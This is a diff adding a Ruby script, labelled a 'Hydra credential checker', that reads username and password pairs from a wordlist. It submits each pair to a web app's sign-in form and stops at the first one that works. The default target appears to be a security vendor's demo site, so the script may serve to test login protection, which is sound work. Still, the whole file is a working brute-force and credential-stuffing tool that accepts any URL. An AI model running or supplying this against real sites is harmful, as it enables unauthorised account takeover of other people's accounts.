@@ -1,0 +1,82 @@
+#!/usr/bin/env ruby
+
+require 'colorize'
+
+def is_login_valid(host, user, password)
+  # create Mechanize instance
+  Mechanize.start do |agent|
+
+    url = "#{host}/users/sign_in"
+
+    login_form = agent.get(url).form_with(id: 'new_user')
+    login_form.field_with(id: 'user_email').value = user
+    login_form.field_with(id: 'user_password').value = password
+
+    # submit login form
+    res = agent.submit(login_form, login_form.buttons.first)
+    alert = res.at_css('.alert.alert-danger.alert-dismissable')
+    # puts alert.text
+    if alert.text.include?("Invalid email or password")
+      return {status: 403}
+    else
+      return {status: 200}
+    end
+  end
+rescue Mechanize::ResponseCodeError
+  return {status: 500}
+end
+
+
+if ARGV.size > 2 then
+  $stderr.puts "Usage: #{$0} [bruteforce_file [url]]"
+  $stderr.puts ""
+  $stderr.puts "URL defaults to https://disrupt.sqreen.io/"
+  exit(-1) 
+end
+
+default_bf = File.join(File.dirname($0), '..', 'bflist.txt')
+
+file = ARGV[0] || default_bf
+to = ARGV[1] || 'https://disrupt.sqreen.io/'
+
+require 'uri'
+
+if URI.parse(to)
+  uri = URI.parse(to)
+  unless uri.kind_of?(URI::HTTP) or uri.kind_of?(URI::HTTPS)
+    $stderr.puts "not an url: #{to}"
+    exit(-1)
+  end
+end
+
+if not File.exist?(file) then
+  $stderr.puts "not a file: #{file}"
+  exit(-1)
+end
+
+require 'mechanize'
+
+puts
+puts "Hydra credential checker".colorize(:color => :white, :background => :red)
+puts
+
+for line in File.readlines(file) do
+  next if line.strip.empty?
+  user, password = line.strip.split(/ +/)
+  $stdout.write "trying #{user}:#{password}..."
+  $stdout.flush
+  
+  res = is_login_valid(to, user, password)
+
+  case res[:status]
+  when 200
+    $stdout.puts(" OK!".green)
+    break
+  when 403
+    $stdout.puts(" failure".colorize(:blue))
+  when 500
+    $stdout.puts(" server error".red)
+    break
+  end
+
+end
